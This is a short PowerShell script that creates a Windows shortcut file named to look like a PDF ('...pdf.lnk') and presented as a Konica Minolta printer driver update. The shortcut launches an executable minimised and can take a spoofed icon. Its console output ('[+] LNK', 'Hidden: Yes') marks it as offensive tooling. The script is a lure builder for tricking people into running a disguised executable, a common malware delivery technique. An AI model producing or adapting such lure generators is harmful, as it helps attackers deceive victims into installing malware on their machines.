param(
    [string]$ExePath = "konica_minolta_printer-driver-update.exe",
    [string]$OutputPath = "Konica_Minolta_Universal_Printer_Driver_v2.3.1.pdf.lnk",
    [string]$IconPath = "",
    [string]$Description = "Konica Minolta Universal Printer Driver v2.3.1",
    [string]$WorkingDir = ""
)

$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut((Resolve-Path $OutputPath -ErrorAction SilentlyContinue).Path ?? (Join-Path (Get-Location) $OutputPath))

$shortcut.TargetPath = $ExePath
$shortcut.Description = $Description
$shortcut.WindowStyle = 7

if ($IconPath -ne "" -and (Test-Path $IconPath)) {
    $shortcut.IconLocation = $IconPath
}

if ($WorkingDir -ne "") {
    $shortcut.WorkingDirectory = $WorkingDir
} else {
    $shortcut.WorkingDirectory = Split-Path $ExePath -Parent
}

$shortcut.Save()
Write-Host "[+] LNK: $OutputPath"
Write-Host "    Target: $ExePath"
Write-Host "    Hidden: Yes (WindowStyle=7)"
$bytes = [System.IO.File]::ReadAllBytes($OutputPath)
Write-Host "    Size: $($bytes.Length) bytes"
